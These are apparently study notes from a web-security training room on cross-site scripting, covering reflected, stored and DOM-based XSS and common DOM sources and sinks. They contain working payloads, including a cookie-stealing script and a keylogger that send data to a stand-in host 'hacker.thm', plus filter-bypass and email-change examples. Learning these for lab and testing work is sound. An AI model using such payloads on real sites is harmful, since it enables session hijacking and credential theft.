--- ---

<h4>What is XSS</h4>

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.

- What is a payload?

	In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

	The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

	Here are some examples of XSS intentions.

- Proof Of Concept:

	This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

	`<script>alert('XSS');</script>`

- Session Stealing:

	Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

	`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  

- Key Logger:

	The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

	`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

- Business Logic:

	This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

	`<script>user.changeEmail('attacker@hacker.thm');</script>`

	Now that the email address for the account has changed, the attacker may perform a reset password attack.

--- ---

<h4>Reflected XSS</h4>

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

- **Potential Impact:**  
  
	The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

- **How to test for Reflected XSS:**  

	You'll need to test every possible point of entry; these include:

	-   `Parameters in the URL Query String`
	-   `URL File Path`
	-   `Sometimes HTTP Headers (although unlikely exploitable in practice)`
	-   `Title name of a website post` ---> 
		- example
			![[Pasted image 20221129102249.png]] 

   
Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected
--- ---

<h4>Stored XSS</h4>

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.  
  
- **Potential Impact:**  
  
The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

	**How to test for Stored XSS:**  

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:  

	-   Comments on a blog
	-   User profile information  
	-   Website Listings  
	-   Button (Bypass filter that dont allow code) `<button onclick=alert(‘xss’)>click</button>`
    
Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 

Once you've found some data which is being stored in the web application,  you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected.

--- ---
--- ---

<h4>What is the DOM?</h4>

DOM stands for **D**ocument **O**bject **M**odel and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:

![24a54ac532b5820bf0ffdddf00ab2247](https://github.com/Jkrathod/IMP-AppSec_Interview_QnA/assets/110445358/9cda973d-5a4d-4fc1-9116-7f7d0114fcf9)


If you want to learn more about the DOM and gain a deeper understanding [w3.org](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html) have a great resource.

- Exploiting the DOM

	DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.  
  
- Example Scenario
  
	The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.  
  
- Potential Impact
  
	Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

	How to test for Dom Based XSS:

	DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "**window.location.x**" parameters.

	When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as **eval()**. 

```Terminal
<img src=x onerror=confirm(ELEMENT)>

#Location sink 
document.domain 

#More examples of location sinks 
document.location 
window.location.replace() 
window.location.assign() 


#Execution Sink 
eval() 
setTimeout() 
setInterval()
Function()


#Common Sources
document.URL 
document.documentURI 
document.URLUnencoded 
document.baseURI location 
document.cookie 
document.referrer 
window.name 
history.pushState 
history.replaceState 
localStorage 
sessionStorage 
```